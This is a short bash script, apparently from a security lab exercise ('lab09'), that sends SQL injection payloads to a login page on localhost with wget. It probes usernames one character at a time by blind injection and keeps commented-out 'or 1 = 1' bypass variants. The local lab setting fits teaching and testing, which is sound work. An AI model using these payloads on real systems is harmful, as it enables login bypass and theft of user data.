#!/bin/bash

address="http://localhost/lab09/login.php?u="
#address+=$1
address+="\" OR id = 98 AND SUBSTRING(username,1,1) = 'a' " 
#address+="\" or 1 = 1"
address+="\" -- "
#address+="&p="
#address+="\" or 1 --"
#address+=" "
#wget -O index.html "`  echo $address ` "
wget -q -O - "`  echo $address ` "

#if wget  -q -O -  "`  echo $address ` " | grep -q 'cat.JPG'; then
#	echo 'yeaaaaaah'
#fi	
echo

#cat index.html
#rm index.html
